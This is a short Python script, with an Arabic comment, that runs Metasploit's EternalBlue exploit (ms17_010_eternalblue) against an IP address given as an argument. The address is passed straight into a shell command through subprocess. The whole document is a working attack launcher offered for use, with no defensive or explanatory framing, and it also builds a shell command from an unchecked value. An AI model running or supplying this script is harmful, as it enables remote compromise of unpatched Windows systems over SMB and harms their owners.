import subprocess

def exploit_windows(ip_address):
    exploit_command = f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip_address}; exploit'"
    subprocess.run(exploit_command, shell=True)

# استخدام الدالة مع عنوان IP كمعامل
exploit_windows("العنوان_IP")
